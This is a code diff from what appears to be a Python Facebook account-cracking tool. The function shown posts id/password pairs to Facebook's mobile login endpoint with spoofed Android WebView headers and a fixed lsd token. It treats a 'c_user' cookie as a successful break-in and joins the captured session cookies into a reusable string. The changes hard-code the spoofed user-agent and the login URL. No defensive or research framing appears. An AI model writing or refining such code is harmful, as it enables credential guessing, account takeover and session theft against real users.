@@ -323,7 +323,7 @@ def _M1_(ids,pasx):
                         'content-length': '1662',
                         'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"',
                         'sec-ch-ua-mobile': '?1',
-                        'user-agent': KING,
+                        'user-agent': 'Mozilla/5.0 (Linux; Android 11; Pixel 4 Build/RQ1A.210205.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.212 Mobile Safari/537.36 [FBAN/FB4A;FBAV/288.0.0.72.119;FBBV/176964424;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/176964424;FBCR/]',
                         'x-response-format': 'JSONStream',
                         'content-type': 'application/x-www-form-urlencoded',
                         'x-fb-lsd': 'AVrEIFcZUZg',
@@ -344,8 +344,7 @@ def _M1_(ids,pasx):
                         'referer': f'https://m.facebook.com/login/?wtsid=rdr_0HpBBBchEc4DCrXrX&refsrc=deprecated&_rdr',
                         'accept-encoding': 'gzip, deflate, br',
                         'accept-language': 'en-IE,en-US;q=0.9,en;q=0.8'}
-                        url=f"https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
-                        lo = session.post(url,data=info,headers=had).text
+                        lo = session.post("https://m.facebook.com/login/device-based/login/async/",data=info,headers=had).text
                         BLACK=session.cookies.get_dict().keys()
                         if 'c_user' in BLACK:
                                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
